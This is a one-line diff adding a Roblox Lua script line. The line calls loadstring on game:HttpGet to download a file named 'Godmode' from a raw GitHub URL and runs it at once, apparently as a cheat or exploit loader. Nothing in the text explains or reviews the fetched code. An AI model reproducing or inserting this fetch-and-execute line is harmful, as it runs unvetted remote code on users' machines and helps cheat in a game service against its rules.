@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JesterPVO/God-Mode/refs/heads/main/Godmode"))()
